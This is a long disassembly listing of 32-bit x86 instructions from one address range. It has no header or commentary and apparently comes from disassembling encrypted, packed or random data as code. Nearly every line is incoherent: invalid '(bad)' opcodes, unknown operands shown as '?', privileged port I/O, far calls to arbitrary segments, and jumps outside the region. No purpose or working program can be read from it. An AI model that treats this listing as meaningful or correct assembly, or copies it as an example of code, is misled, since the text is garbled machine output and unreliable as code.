  41b9fb:	inc    edi
  41b9fc:	mov    ebp,0xf6232795
  41ba01:	cs mov ebp,?
  41ba04:	mov    esp,0x7f97b6bb
  41ba09:	or     al,0x1d
  41ba0b:	sbb    al,0x82
  41ba0d:	dec    ecx
  41ba0e:	mov    edx,edi
  41ba10:	mov    ds:0x28895707,al
  41ba15:	call   0xb1:0xbbc04a75
  41ba1c:	xchg   ebp,eax
  41ba1d:	fcom   QWORD PTR [edx-0x35]
  41ba20:	(bad)  
  41ba21:	int    0xcc
  41ba23:	js     0x41b9a8
  41ba25:	out    dx,al
  41ba26:	sbb    al,0x13
  41ba28:	push   ds
  41ba29:	xor    ebx,DWORD PTR [eax]
  41ba2b:	retf   
  41ba2c:	jno    0x41ba59
  41ba2e:	xchg   ebp,eax
  41ba2f:	add    BYTE PTR [esi+0x22548bd8],dl
  41ba35:	leave  
  41ba36:	push   es
  41ba37:	xchg   ebp,eax
  41ba38:	mov    bl,0xf7
  41ba3a:	je     0x41b9ef
  41ba3c:	dec    ebp
  41ba3d:	dec    esp
  41ba3e:	cmp    BYTE PTR [edx],dh
  41ba40:	pop    eax
  41ba41:	pop    eax
  41ba42:	or     DWORD PTR [ecx+0x42d2e35a],ebx
  41ba48:	(bad)  
  41ba49:	out    0x54,eax
  41ba4b:	xchg   edx,eax
  41ba4c:	xchg   ebp,eax
  41ba4d:	xchg   edx,eax
  41ba4e:	mov    esi,es
  41ba50:	in     eax,dx
  41ba51:	or     eax,0xc7bc2886
  41ba56:	pop    ebp
  41ba57:	lods   al,BYTE PTR ds:[esi]
  41ba58:	mov    ah,0x57
  41ba5a:	fbld   TBYTE PTR [edx+edi*1-0x1a7fe3bc]
  41ba61:	sbb    BYTE PTR [ecx],bh
  41ba63:	pop    esi
  41ba64:	fcmovu st,st(3)
  41ba66:	sub    bl,0xde
  41ba69:	mov    dl,0x9a
  41ba6b:	mov    ebx,0xb628b3f6
  41ba70:	xor    al,0x90
  41ba72:	add    BYTE PTR [eax-0x79018e0c],0x33
  41ba79:	lea    eax,[esi+0x5e]
  41ba7c:	sub    eax,0x8608087d
  41ba81:	push   ebx
  41ba82:	xchg   ebp,eax
  41ba83:	cmp    BYTE PTR [esp+ebx*8+0x4e],ah
  41ba87:	not    DWORD PTR [ebp-0x9]
  41ba8a:	retf   0x23c9
  41ba8d:	mov    eax,0xa67d3b23
  41ba92:	adc    BYTE PTR [edx+0x7e],bh
  41ba95:	loop   0x41baa4
  41ba97:	(bad)  
  41ba98:	mov    dh,0x5d
  41ba9a:	fcmovnu st,st(4)
  41ba9c:	push   0x32020509
  41baa1:	out    dx,al
  41baa2:	sar    BYTE PTR [ebx],0xaa
  41baa5:	xchg   esp,eax
  41baa6:	mov    ds:0xb12d05b3,al
  41baab:	add    BYTE PTR [eax-0x24],ah
  41baae:	inc    ecx
  41baaf:	jns    0x41bb0b
  41bab1:	(bad)  
  41bab2:	imul   ecx,DWORD PTR [eax-0x58],0xd40aa869
  41bab9:	outs   dx,BYTE PTR ds:[esi]
  41baba:	fs leave 
  41babc:	cli    
  41babd:	adc    eax,0xa29c9ec9
  41bac2:	mov    bh,0xc5
  41bac4:	pop    esp
  41bac5:	sub    BYTE PTR [edx],0xd0
  41bac8:	aad    0x5a
  41baca:	dec    edi
  41bacb:	pop    ds
  41bacc:	mov    ebx,0x118435f2
  41bad1:	mov    ch,0x99
  41bad3:	xchg   BYTE PTR [esi+eax*1-0x785b340c],dl
  41bada:	shl    BYTE PTR [edi],0x89
  41badd:	mov    ch,0x74
  41badf:	test   eax,0xb99d6ef0
  41bae4:	in     al,dx
  41bae5:	inc    ebx
  41bae6:	jmp    0x41ba78
  41bae8:	mov    cl,0x22
  41baea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baeb:	jmp    esp
  41baed:	mov    edx,0x29f5b2ec
  41baf2:	xor    eax,0x91195bc3
  41baf7:	xor    al,0x53
  41baf9:	and    eax,0xad7230b0
  41bafe:	mov    ds:0xe7f5d59e,eax
  41bb03:	das    
  41bb04:	cmp    ecx,ebx
  41bb06:	sub    eax,0xe247cc24
  41bb0b:	push   esi
  41bb0c:	jnp    0x41ba8f
  41bb0e:	mov    edi,DWORD PTR [esi+0x123c3816]
  41bb14:	(bad)  
  41bb15:	cs retf 
  41bb17:	popa   
  41bb18:	mov    cl,bl
  41bb1a:	xor    BYTE PTR [eax],cl
  41bb1c:	push   ds
  41bb1d:	lds    edx,FWORD PTR ds:0x4cbccd4a
  41bb23:	and    ah,BYTE PTR [eax-0xd]
  41bb26:	inc    ecx
  41bb27:	int    0xd2
  41bb29:	mul    BYTE PTR [edi-0x7d]
  41bb2c:	xchg   edi,eax
  41bb2d:	int    0x3c
  41bb2f:	out    dx,al
  41bb30:	or     cl,BYTE PTR [ecx+eiz*2+0xc27008c]
  41bb37:	mov    esp,0x96ebe24
  41bb3c:	call   0x4e3c:0xb4aa7257
  41bb43:	dec    ecx
  41bb44:	mov    dl,0xdf
  41bb46:	add    DWORD PTR [esi],esp
  41bb48:	cdq    
  41bb49:	ret    0xfb91
  41bb4c:	sahf   
  41bb4d:	mov    ch,0x2c
  41bb4f:	test   DWORD PTR [ecx+0x1c0c8481],ebp
  41bb55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb56:	sbb    eax,0xb0f1c539
  41bb5b:	scas   al,BYTE PTR es:[edi]
  41bb5c:	repz xlat BYTE PTR ds:[ebx]
  41bb5e:	mov    edi,0x7183d73a
  41bb63:	pop    gs
  41bb65:	test   eax,0xe61ae191
  41bb6a:	sub    BYTE PTR [edi+eiz*4+0x79],0xc
  41bb6f:	fst    DWORD PTR [eax]
  41bb71:	xchg   esp,eax
  41bb72:	inc    ecx
  41bb73:	sbb    edx,DWORD PTR [esi]
  41bb75:	stos   BYTE PTR es:[edi],al
  41bb76:	jg     0x41bb9a
  41bb78:	in     eax,dx
  41bb79:	mov    DWORD PTR [ecx],ecx
  41bb7b:	pushf  
  41bb7c:	cmp    BYTE PTR es:[esi+0x4d6fb259],bh
  41bb83:	inc    ebp
  41bb84:	lods   eax,DWORD PTR ds:[esi]
  41bb85:	sti    
  41bb86:	or     ebx,DWORD PTR [ebx-0xc]
  41bb89:	add    DWORD PTR [ecx-0x58],eax
  41bb8c:	adc    DWORD PTR [edx],edi
  41bb8e:	push   0xffffff83
  41bb90:	(bad)  
  41bb91:	mov    DWORD PTR [esi-0x68adfb23],0xf2bce4e
  41bb9b:	daa    
  41bb9c:	add    ebp,DWORD PTR [esi+ebx*4]
  41bb9f:	ja     0x3abfb7a
  41bba5:	mov    ah,0xd3
  41bba7:	ret    
  41bba8:	push   es
  41bba9:	push   0xffffffe5
  41bbab:	push   esi
  41bbac:	sub    ch,BYTE PTR [ebp-0x1b]
  41bbaf:	mov    al,bh
  41bbb1:	xchg   edi,eax
  41bbb2:	push   esi
  41bbb3:	xlat   BYTE PTR ds:[ebx]
  41bbb4:	and    DWORD PTR [ebp-0x14bc4873],edi
  41bbba:	jg     0x41bc01
  41bbbc:	into   
  41bbbd:	mov    ch,0xa7
  41bbbf:	lahf   
  41bbc0:	mov    esi,0x1a92d53c
  41bbc5:	je     0x41bc19
  41bbc7:	(bad)  
  41bbc8:	out    dx,eax
  41bbc9:	cmp    eax,0xf4cadfe2
  41bbce:	(bad)  
  41bbcf:	cdq    
  41bbd0:	jns    0x41bbb3
  41bbd2:	imul   esp,DWORD PTR [ebp+eiz*2-0x4b7544a1],0x5c
  41bbda:	add    DWORD PTR fs:[ebx+0x1f78ce2c],esp
  41bbe1:	dec    BYTE PTR [eax+0x7de0db10]
  41bbe7:	fisub  WORD PTR [edx+0x41]
  41bbea:	(bad)  [esi]
  41bbec:	fwait
  41bbed:	push   eax
  41bbee:	aam    0xc8
  41bbf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbf1:	mov    edi,ss
  41bbf3:	aad    0x52
  41bbf5:	and    al,0x6d
  41bbf7:	clc    
  41bbf8:	jecxz  0x41bc5f
  41bbfa:	mov    eax,ds:0xea40067c
  41bbff:	in     eax,0xb
  41bc01:	mov    ch,0x89
  41bc03:	push   edx
  41bc04:	sbb    edi,DWORD PTR [eax]
  41bc06:	lahf   
  41bc07:	(bad)  
  41bc09:	mov    bh,0xff
  41bc0b:	(bad)  
  41bc0c:	mov    cl,0x42
  41bc0e:	sahf   
  41bc0f:	pop    ss
  41bc10:	fwait
  41bc11:	adc    ebx,eax
  41bc13:	es inc eax
  41bc15:	(bad)  
  41bc16:	lock xor edi,DWORD PTR [edi]
  41bc19:	cmp    al,0xbd
  41bc1b:	jb     0x41bc26
  41bc1d:	jl     0x41bc0c
  41bc1f:	push   cs
  41bc20:	dec    ecx
  41bc21:	mov    ebp,0x72ff280b
  41bc26:	(bad)  
  41bc28:	cwde   
  41bc29:	daa    
  41bc2a:	test   eax,0xd81f57ba
  41bc2f:	jp     0x41bc03
  41bc31:	push   ss
  41bc32:	xor    ebp,DWORD PTR [edx+ebp*4+0x65]
  41bc36:	inc    eax
  41bc37:	and    BYTE PTR [esi-0x53],ch
  41bc3a:	(bad)  
  41bc3b:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc3d:	cmp    al,0xde
  41bc3f:	adc    DWORD PTR [edi],ebp
  41bc41:	or     ch,BYTE PTR ds:0x7868d5d8
  41bc47:	jae    0x41bc64
  41bc49:	and    ah,BYTE PTR [edi]
  41bc4b:	or     eax,0x8d1c5d7f
  41bc50:	(bad)  
  41bc51:	iret   
  41bc52:	int3   
  41bc53:	ss mov esp,0x4e7ebe36
  41bc59:	mov    dh,0xe8
  41bc5b:	(bad)  
  41bc5c:	mov    al,ds:0x951688b8
  41bc61:	mov    dl,0x97
  41bc63:	jns    0x41bcce
  41bc65:	mov    ah,0xfa
  41bc67:	jnp    0x41bcd4
  41bc69:	ja     0x41bc38
  41bc6b:	cs pushf 
  41bc6d:	or     al,0x6f
  41bc6f:	push   ebp
  41bc70:	mov    esp,0xfc4757f
  41bc75:	sahf   
  41bc76:	inc    ebp
  41bc77:	or     edx,DWORD PTR es:[eax]
  41bc7a:	lods   eax,DWORD PTR ds:[esi]
  41bc7b:	jmp    0x1405:0x7e4241ef
  41bc82:	and    al,0xed
  41bc84:	lock out dx,al
  41bc86:	add    DWORD PTR [edi+0x703330f6],0xc66e952b
  41bc90:	es xor al,0x77
  41bc93:	in     al,0x43
  41bc95:	xor    DWORD PTR [ecx+0x259b5d4b],ecx
  41bc9b:	mov    eax,ds:0x478d98c8
  41bca0:	mov    dh,0x66
  41bca2:	fwait
  41bca3:	loopne 0x41bcb5
  41bca5:	sub    DWORD PTR [ecx+0x29eca8e8],edx
  41bcab:	jb     0x41bc41
  41bcad:	mov    WORD PTR [edi+0x170b2014],?
  41bcb3:	fistp  QWORD PTR [edx-0x67]
  41bcb6:	xchg   edx,eax
  41bcb7:	xor    cl,bh
  41bcb9:	sub    bh,ah
  41bcbb:	adc    BYTE PTR [edx-0x642eb78b],dl
  41bcc1:	inc    ebx
  41bcc2:	cmp    eax,0xf2501337
  41bcc7:	and    ch,dh
  41bcc9:	fld    DWORD PTR fs:[eax+0x5bb7bcb0]
  41bcd0:	iret   
  41bcd1:	push   ebx
  41bcd2:	mul    DWORD PTR [ecx+eax*1+0xc]
  41bcd6:	mov    bh,0x74
  41bcd8:	ficom  DWORD PTR [edi+0x3456dd2e]
  41bcde:	int    0x51
  41bce0:	outs   dx,BYTE PTR ds:[esi]
  41bce1:	dec    ecx
  41bce2:	mov    cl,0x2b
  41bce4:	fdiv   st,st(0)
  41bce6:	gs into 
  41bce8:	call   DWORD PTR [ebp+0x4e]
  41bceb:	daa    
  41bcec:	adc    al,0xea
  41bcee:	add    esi,eax
  41bcf0:	sbb    esi,esi
  41bcf2:	add    BYTE PTR [ebx+0x75],bh
  41bcf5:	xchg   BYTE PTR [edx-0x7d200e18],dl
  41bcfb:	inc    esi
  41bcfc:	or     ebx,esp
  41bcfe:	aad    0x86
  41bd00:	stos   BYTE PTR es:[edi],al
  41bd01:	mov    ?,esp
  41bd03:	add    dl,0xbf
  41bd06:	outs   dx,DWORD PTR ds:[esi]
  41bd07:	lea    esp,[ecx-0x74803083]
  41bd0d:	xchg   edx,eax
  41bd0e:	mov    ebx,0x937cd572
  41bd13:	in     al,dx
  41bd14:	or     DWORD PTR [ebp+0x3d982754],edi
  41bd1a:	out    0xc5,eax
  41bd1c:	mov    bl,0x34
  41bd1e:	push   0x397a7527
  41bd23:	mov    dl,0xcd
  41bd25:	leave  
  41bd26:	mov    ecx,DWORD PTR [esi]
  41bd28:	add    DWORD PTR [eax+0x73d12ec0],esi
  41bd2e:	addr16 retf 
  41bd30:	push   DWORD PTR [ebp+0x45]
  41bd33:	and    al,0x6a
  41bd35:	scas   al,BYTE PTR es:[edi]
  41bd36:	pop    edi
  41bd37:	mov    dl,0x7c
  41bd39:	ret    0xdc
  41bd3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd3d:	cmp    al,0xea
  41bd3f:	adc    edx,DWORD PTR [ebx+0x68]
  41bd42:	xchg   BYTE PTR ss:[edx-0x69],cl
  41bd46:	pop    edx
  41bd47:	ss (bad) 
  41bd49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd4a:	repnz mov eax,ds:0xa48dff68
  41bd50:	and    bl,BYTE PTR [ebx]
  41bd52:	leave  
  41bd53:	popf   
  41bd54:	pop    esp
  41bd55:	adc    BYTE PTR [ebx],dh
  41bd57:	dec    esp
  41bd58:	cmp    ah,BYTE PTR [ecx+0x7c]
  41bd5b:	push   ebx
  41bd5c:	dec    esi
  41bd5d:	ret    
  41bd5e:	loopne 0x41bdab
  41bd60:	test   DWORD PTR [edx+0x36941661],esi
  41bd66:	inc    edi
  41bd67:	js     0x41bd96
  41bd69:	pop    esp
  41bd6a:	or     BYTE PTR [ebx+0x6f1aa988],bh
  41bd70:	add    eax,0x4b71db07
  41bd75:	lock daa 
  41bd77:	inc    ecx
  41bd78:	sbb    DWORD PTR [ebp-0x66b83fc8],edi
  41bd7e:	iret   
  41bd7f:	mov    ds:0xd1ff6900,eax
  41bd84:	int3   
  41bd85:	xor    al,0x5a
  41bd87:	fsub   QWORD PTR [ebp+0x191aac18]
  41bd8d:	push   0x7b8dd91d
  41bd92:	cmc    
  41bd93:	pushf  
  41bd94:	cmp    al,ch
  41bd96:	(bad)  
  41bd97:	dec    BYTE PTR [eax]
  41bd99:	adc    edi,0x44
  41bd9c:	stc    
  41bd9d:	sbb    BYTE PTR [eax+0x6a34127],cl
  41bda3:	call   0xb0cf:0x5f3e531a
  41bdaa:	jo     0x41bd99
  41bdac:	and    eax,0x8967701c
  41bdb1:	push   cs
  41bdb2:	cld    
  41bdb3:	push   esp
  41bdb4:	or     al,0x4b
  41bdb6:	mov    bh,0x8
  41bdb8:	aas    
  41bdb9:	and    al,0xe1
  41bdbb:	add    BYTE PTR [edx+0x28],al
  41bdbe:	mov    esp,ebx
  41bdc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdc1:	xchg   ecx,eax
  41bdc2:	sub    bl,cl
  41bdc4:	repz popa 
  41bdc6:	test   eax,0xa2698711
  41bdcb:	jbe    0x41bde4
  41bdcd:	adc    BYTE PTR [esp+ebx*2-0x3406d7e7],bh
  41bdd4:	aam    0x8b
  41bdd6:	xadd   al,bl
  41bdd9:	xchg   ebp,eax
  41bdda:	sbb    al,0x4b
  41bddc:	adc    dl,BYTE PTR [ebp+0x40]
  41bddf:	mov    bh,0x7f
  41bde1:	shl    al,0xc7
  41bde4:	daa    
  41bde5:	fwait
  41bde6:	cwde   
  41bde7:	push   edx
  41bde8:	adc    eax,DWORD PTR [ecx+ecx*2]
  41bdeb:	sbb    ecx,DWORD PTR [ecx-0x7c]
  41bdee:	or     DWORD PTR [ecx+0x34],0x64258fec
  41bdf5:	lods   al,BYTE PTR ds:[esi]
  41bdf6:	lock mov dl,0x16
  41bdf9:	(bad)  
  41bdfa:	dec    ebp
  41bdfb:	scas   al,BYTE PTR es:[edi]
  41bdfc:	sbb    dh,BYTE PTR [ecx-0x370110ba]
  41be02:	and    DWORD PTR [ecx+0x17],esi
  41be05:	or     al,0xe3
  41be07:	and    al,al
  41be09:	dec    edx
  41be0a:	ja     0x41be48
  41be0c:	sub    DWORD PTR [eax-0x74],0x7b
  41be10:	aas    
  41be11:	jecxz  0x41be3d
  41be13:	or     al,0x1d
  41be15:	or     bh,BYTE PTR [ecx+0xb]
  41be18:	loope  0x41be8f
  41be1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be1b:	mov    al,ds:0x34593f19
  41be20:	jnp    0x41be13
  41be22:	pusha  
  41be23:	inc    ecx
  41be24:	adc    DWORD PTR [esi+edi*4+0x7bf22a00],edx
  41be2b:	xlat   BYTE PTR ds:[ebx]
  41be2c:	pusha  
  41be2d:	push   ds
  41be2e:	xchg   BYTE PTR [eax],bh
  41be30:	sub    dl,BYTE PTR [edx-0x4d6ebc30]
  41be36:	mov    bh,0x1b
  41be38:	push   edi
  41be39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be3a:	cmp    DWORD PTR [ecx+0x35],0x19689f07
  41be41:	sbb    edx,DWORD PTR [esi+0x1e48a441]
  41be47:	inc    eax
  41be48:	add    eax,0xd00d0e02
  41be4d:	sbb    edx,esi
  41be4f:	ret    
  41be50:	mov    ah,0xde
  41be52:	push   ss
  41be53:	test   DWORD PTR [ecx+0x1986097c],eax
  41be59:	xor    ch,0x6b
  41be5c:	sub    edi,esi
  41be5e:	xor    ebp,DWORD PTR [esi+0x16]
  41be61:	test   BYTE PTR [eax+0x43],dl
  41be64:	imul   ebx,DWORD PTR [ebp+0x645d8e6],0x49a05238
  41be6e:	pop    ebx
  41be6f:	mov    ch,0x71
  41be71:	sub    BYTE PTR [eax-0x32dbea66],al
  41be77:	test   al,ch
  41be79:	cmp    dh,BYTE PTR [ebx+0x18]
  41be7c:	icebp  
  41be7d:	push   esi
  41be7e:	mov    WORD PTR [edi+0x44],cs
  41be81:	cmp    BYTE PTR [ebp+0x5b],dh
  41be84:	push   edx
  41be85:	jmp    0x41bed6
  41be87:	inc    edi
  41be88:	arpl   dx,sp
  41be8a:	adc    al,0x9
  41be8c:	or     esp,DWORD PTR [edi-0x88cd6ba]
  41be92:	inc    esp
  41be93:	into   
  41be94:	cmp    ah,BYTE PTR [ecx+0x4908d36f]
  41be9a:	dec    ecx
  41be9b:	add    al,0x50
  41be9d:	test   ebp,edi
  41be9f:	mov    dl,0xc3
  41bea1:	ror    eax,cl
  41bea3:	imul   ecx,DWORD PTR [edi-0x39],0x1a
  41bea7:	(bad)  
  41bea8:	sahf   
  41bea9:	adc    ch,BYTE PTR [esi]
  41beab:	adc    BYTE PTR [edi+0x75],bh
  41beae:	in     al,dx
  41beaf:	lods   eax,DWORD PTR ds:[esi]
  41beb0:	(bad)  
  41beb1:	xchg   ebp,eax
  41beb2:	test   al,0x3b
  41beb4:	in     eax,0x7c
  41beb6:	mov    ds:0xd3af7931,eax
  41bebb:	mov    ds,edi
  41bebd:	mov    eax,ds:0x7d813950
  41bec2:	pop    esi
  41bec3:	sub    ecx,DWORD PTR [esi-0x127abfab]
  41bec9:	stc    
  41beca:	cmp    DWORD PTR [ebp-0x1da97554],0x3f
  41bed1:	jb     0x41bea8
  41bed3:	inc    ebp
  41bed4:	lods   eax,DWORD PTR ds:[esi]
  41bed5:	dec    DWORD PTR [ebp-0x1a]
  41bed8:	mov    al,0x2a
  41beda:	adc    al,BYTE PTR [eax+0x49b606de]
  41bee0:	and    BYTE PTR ds:0x515e979c,ch
  41bee6:	inc    edx
  41bee7:	add    eax,0xb722da38
  41beec:	mov    ds:0x8fc91fe1,eax
  41bef1:	push   ds
  41bef2:	es push eax
  41bef4:	add    edi,DWORD PTR [ebp-0x62]
  41bef7:	cli    
  41bef8:	dec    ebx
  41bef9:	xor    DWORD PTR [ecx-0x2b006b5],esi
  41beff:	push   ss
  41bf00:	popa   
  41bf01:	dec    edx
  41bf02:	mov    ebx,0xfba818a8
  41bf07:	push   edi
  41bf08:	sub    BYTE PTR [edi],ch
  41bf0a:	fnstcw WORD PTR [ebx+0x5dcc5d77]
  41bf10:	mov    esp,0x609f1007
  41bf15:	or     DWORD PTR [ebp+edx*8-0x28],esi
  41bf19:	xchg   DWORD PTR [ebx+0x0],edx
  41bf1c:	pop    ebx
  41bf1d:	fldl2t 
  41bf1f:	dec    edi
  41bf20:	mov    ds:0x95e311b3,eax
  41bf25:	stos   DWORD PTR es:[edi],eax
  41bf26:	cmp    BYTE PTR [edx-0x67],al
  41bf29:	stos   BYTE PTR es:[edi],al
  41bf2a:	call   0x5dad:0xf40acbd9
  41bf31:	cmp    al,0x35
  41bf33:	test   BYTE PTR [edi],0x2d
  41bf36:	lock jae 0x41bfb1
  41bf39:	mov    esp,0x481ce6d6
  41bf3e:	pop    ss
  41bf3f:	aaa    
  41bf40:	push   esi
  41bf41:	repnz out 0x70,al
  41bf44:	arpl   WORD PTR [esi-0x2d0355dc],sp
  41bf4a:	das    
  41bf4b:	or     al,0x7b
  41bf4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf4e:	mov    ecx,DWORD PTR [esp+eax*2+0x17bf96f4]
  41bf55:	sub    bh,BYTE PTR [ecx]
  41bf57:	sbb    BYTE PTR [edx+0x521b0706],0xd1
  41bf5e:	xchg   ebx,eax
  41bf5f:	mov    edi,0x6d897dec
  41bf64:	jne    0x41bfd5
  41bf66:	jmp    FWORD PTR [ebx-0x42]
  41bf69:	cli    
  41bf6a:	daa    
  41bf6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf6c:	fxch   st(7)
  41bf6e:	fmul   QWORD PTR [edi+0x5a]
  41bf71:	idiv   DWORD PTR [edx]
  41bf73:	sub    dl,BYTE PTR [ecx+edi*1]
  41bf76:	cdq    
  41bf77:	xchg   ebp,eax
  41bf78:	aaa    
  41bf79:	or     eax,0xce8e5799
  41bf7e:	(bad)  
  41bf7f:	bound  ebx,QWORD PTR [edi-0x72]
  41bf82:	inc    edx
  41bf83:	adc    bl,BYTE PTR [ecx-0x20]
  41bf86:	pop    es
  41bf87:	mov    esi,0x220a46e4
  41bf8c:	cmp    BYTE PTR [ebx+eax*2+0xe],ah
  41bf90:	hlt    
  41bf91:	test   BYTE PTR [ecx+ecx*4],dh
  41bf94:	inc    esp
  41bf95:	dec    eax
  41bf96:	daa    
  41bf97:	pop    esp
  41bf98:	add    eax,0xf5bdb827
  41bf9d:	inc    eax
  41bf9e:	dec    ecx
  41bf9f:	mov    dh,0xed
  41bfa1:	in     al,0xfd
  41bfa3:	push   cs
  41bfa4:	outs   dx,DWORD PTR ds:[esi]
  41bfa5:	dec    ebp
  41bfa6:	into   
  41bfa7:	(bad)  
  41bfa9:	mov    al,0x60
  41bfab:	pop    ds
  41bfac:	fwait
  41bfad:	inc    bx
  41bfaf:	xor    bh,BYTE PTR [eax+0x5f]
  41bfb2:	sbb    ch,BYTE PTR [esi]
  41bfb4:	inc    ebp
  41bfb5:	dec    esi
  41bfb6:	test   bl,dh
  41bfb8:	inc    esp
  41bfb9:	(bad)  
  41bfba:	imul   ecx,DWORD PTR [ecx-0x5a27e882],0x9a788c71
  41bfc4:	sub    bh,BYTE PTR [edi]
  41bfc6:	imul   edx,DWORD PTR [ebx-0x5],0xffffff9b
  41bfca:	aam    0x3a
  41bfcc:	xor    dl,ah
  41bfce:	push   ebp
  41bfcf:	mov    ds:0xfeddcf08,al
  41bfd4:	sub    ah,dh
  41bfd6:	(bad)  
  41bfd7:	out    dx,eax
  41bfd8:	mov    ecx,0x6a6a83ad
  41bfdd:	mov    ?,edi
  41bfdf:	repz out dx,al
  41bfe1:	pop    esp
  41bfe2:	cmc    
  41bfe3:	out    0x6f,al
  41bfe5:	push   esi
  41bfe6:	stc    
  41bfe7:	cmp    ecx,DWORD PTR [edi+0x5c9b38aa]
  41bfed:	jp     0x41bfd0
  41bfef:	gs iret 
  41bff1:	cli    
  41bff2:	xor    BYTE PTR [eax],0x2f
  41bff5:	mov    ecx,edi
  41bff7:	inc    esi
  41bff8:	ins    DWORD PTR es:[edi],dx
  41bff9:	adc    DWORD PTR [eax],ebx
  41bffb:	(bad)  
  41bffc:	jmp    0x6ed268ec
  41c001:	arpl   dx,si
  41c003:	shl    dl,1
  41c005:	(bad)  
  41c007:	loopne 0x41bfe1
  41c009:	adc    edx,esp
  41c00b:	lea    edx,[edx]
  41c00d:	fbstp  TBYTE PTR cs:[esi-0x3733854]
  41c014:	sub    esi,DWORD PTR [ebp-0x1e]
  41c017:	mov    al,ds:0xd43d2ebf
  41c01c:	(bad)  
  41c01d:	pop    eax
  41c01e:	loop   0x41bfbe
  41c020:	mov    eax,ds:0x152d2f22
  41c025:	mov    edi,ss
  41c027:	inc    ebx
  41c028:	or     dl,BYTE PTR [eax-0x34]
  41c02b:	mov    bl,BYTE PTR [edi]
  41c02d:	lea    edx,[esp+eiz*4-0x38]
  41c031:	addr16 cli 
  41c033:	mov    al,0xc0
  41c035:	nop
  41c036:	rol    dh,0xc8
  41c039:	pop    esi
  41c03a:	(bad)  
  41c03b:	paddw  xmm3,XMMWORD PTR [edx+ecx*8]
  41c040:	jmp    0x41c0b3
  41c042:	lds    ebp,FWORD PTR [ebp+0x55]
  41c045:	test   al,0xca
  41c047:	out    dx,eax
  41c048:	mov    edi,0xce50649c
  41c04d:	mov    dh,BYTE PTR [eax-0x26]
  41c050:	inc    esp
  41c051:	shl    BYTE PTR [ebx+0xe8729eb],1
  41c057:	mov    dl,0xf8
  41c059:	push   esi
  41c05a:	cmp    edi,esi
  41c05c:	or     edi,esi
  41c05e:	mov    ebx,0x592cb640
  41c063:	push   ebp
  41c064:	(bad)  
  41c065:	mov    ds:0x294247bc,al
  41c06a:	pop    ds
  41c06b:	iret   
  41c06c:	xchg   edi,eax
  41c06d:	fst    QWORD PTR [esi]
  41c06f:	fcomp  QWORD PTR [eax]
  41c071:	and    DWORD PTR gs:[edx+ebp*4+0x60],0xaf1b73e1
  41c07a:	mov    al,0x16
  41c07c:	xor    eax,0x4f
  41c07f:	mov    WORD PTR [esi-0x64ad3f0e],fs
  41c085:	dec    esi
  41c086:	pop    ebx
  41c087:	mov    edx,0xc6c9a8a7
  41c08c:	outs   dx,BYTE PTR ds:[esi]
  41c08d:	lahf   
  41c08e:	loop   0x41c053
  41c090:	imul   ebx,DWORD PTR [ebp+0x3a],0xe9bc314c
  41c097:	stc    
  41c098:	loop   0x41c081
  41c09a:	imul   BYTE PTR [ebp-0x11]
  41c09d:	test   DWORD PTR [ecx-0x51],edx
  41c0a0:	mov    BYTE PTR ds:0x86de9412,bh
  41c0a6:	xchg   ebx,eax
  41c0a7:	dec    edi
  41c0a8:	and    BYTE PTR ds:0x13210e06,cl
  41c0ae:	out    dx,eax
  41c0af:	push   esi
  41c0b0:	fsub   DWORD PTR [edi-0x52a73c92]
  41c0b6:	mov    ch,0xa5
  41c0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0b9:	xchg   BYTE PTR [ebx+eax*4+0x3173878c],bl
  41c0c0:	mov    eax,0x31638602
  41c0c5:	xor    ah,BYTE PTR [esi]
  41c0c7:	ins    DWORD PTR es:[edi],dx
  41c0c8:	xchg   esp,eax
  41c0c9:	mov    esp,0x5026fd7a
  41c0ce:	cmc    
  41c0cf:	or     esi,DWORD PTR [eax]
  41c0d1:	fs (bad) 
  41c0d3:	jmp    0x90a1222f
  41c0d8:	test   DWORD PTR [edi-0x657e409f],ebp
  41c0de:	sbb    ah,BYTE PTR [edx]
  41c0e0:	je     0x41c146
  41c0e2:	test   BYTE PTR [ebx+edi*1],0x17
  41c0e6:	adc    eax,0x564e92d
  41c0eb:	xchg   ebp,eax
  41c0ec:	les    edi,FWORD PTR [edi+0x64]
  41c0ef:	mov    edi,0x42081160
  41c0f4:	push   es
  41c0f5:	into   
  41c0f6:	test   BYTE PTR [bp+0xa27],0xf2
  41c0fc:	push   ecx
  41c0fd:	xchg   ebp,eax
  41c0fe:	leave  
  41c0ff:	call   0xb875:0x8b64f7ce
  41c106:	repz imul ebx,DWORD PTR [edx],0x2867cc2c
  41c10d:	xchg   edi,eax
  41c10e:	fsubr  DWORD PTR [esi-0x1c83cc59]
  41c114:	scas   al,BYTE PTR es:[edi]
  41c115:	ja     0x41c14b
  41c117:	cwde   
  41c118:	in     al,dx
  41c119:	mov    ds:0x15437818,eax
  41c11e:	shr    DWORD PTR [edi+0x45457645],0xf0
  41c125:	pop    ebx
  41c126:	sbb    DWORD PTR [eax-0x24872621],ecx
  41c12c:	and    ch,BYTE PTR [ebx+0x557f05f7]
  41c132:	cmp    DWORD PTR [ebp+0x64],eax
  41c135:	in     eax,dx
  41c136:	or     BYTE PTR [eax],dl
  41c138:	jo     0x41c155
  41c13a:	jo     0x41c14e
  41c13c:	or     ah,dl
  41c13e:	retf   
  41c13f:	jbe    0x41c16d
  41c141:	pop    edi
  41c142:	or     dh,BYTE PTR [edx-0x28]
  41c145:	sub    BYTE PTR [eax+0x413044c3],bh
  41c14b:	cmp    DWORD PTR [eax],ecx
  41c14d:	jmp    0xd30e091e
  41c152:	add    ebx,esi
  41c154:	test   cl,dh
  41c156:	jmp    0x9ea9ebf8
  41c15b:	mov    dh,ah
  41c15d:	inc    eax
  41c15e:	fcmovnu st,st(6)
  41c160:	or     eax,0xa49832c0
  41c165:	push   ebx
  41c166:	pop    eax
  41c167:	dec    ebx
  41c168:	retf   
  41c169:	cdq    
  41c16a:	dec    eax
